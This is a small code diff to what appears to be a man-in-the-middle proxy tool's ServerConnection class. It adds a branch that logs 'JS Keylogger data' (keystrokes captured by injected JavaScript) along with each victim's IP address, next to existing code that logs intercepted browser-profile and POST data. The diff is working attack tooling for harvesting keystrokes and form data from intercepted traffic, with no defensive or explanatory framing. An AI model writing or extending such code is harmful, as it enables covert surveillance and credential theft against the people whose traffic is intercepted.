@@ -78,6 +78,8 @@ class ServerConnection(HTTPClient):
         if 'clientprfl' in self.uri:
             out = pformat(self.post2dict(self.postData))
             logging.warning("Browser Profilerer data from " + str(self.client.getClientIP()) + ":\n" + out)
+        elif 'keylog' in self.uri:
+            logging.warning("JS Keylogger data from " + str(self.client.getClientIP()) + ":\n" + self.postData)
         else:
             logging.warning(self.getPostPrefix() + " Data (" + self.headers['host'] + "):\n" + str(self.postData))
             self.transport.write(self.postData)
